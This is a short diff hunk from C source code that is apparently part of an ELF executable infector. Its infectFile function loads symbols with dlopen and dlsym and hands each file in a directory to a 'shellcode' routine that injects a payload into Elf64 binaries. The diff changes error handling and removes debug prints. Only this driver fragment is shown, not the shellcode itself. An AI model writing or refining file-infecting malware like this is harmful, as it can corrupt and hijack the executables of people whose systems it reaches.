@@ -34,16 +34,17 @@ const char *payload = "HelloWorld";
 /* } */
 
 static int  infectFile(const char *dirname, struct dirent *file, shellcode fun) {
+  int   ret;
   void  *handle;
 
   if ((handle = dlopen(NULL, RTLD_NOW)) == NULL)
     return (-1);
-  dprintf(1, "Executing shellcode...\n");
-  if (fun(dlsym, handle, dirname, file->d_name, payload) == -1)
-    dprintf(1, "Not doing for: %s\n", file->d_name);
+  if ((ret = fun(dlsym, handle, dirname, file->d_name, payload)) == -1)
+    return (-1);
+  else if (ret == 1)
+    dprintf(1, "Error: \"%s\" is not an Elf64 file\n", file->d_name);
   dlclose(handle);
-  dprintf(1, "Done !\n");
-  return (1);
+  return (0);
 
   /* int         fd; */
   /* struct stat stats; */
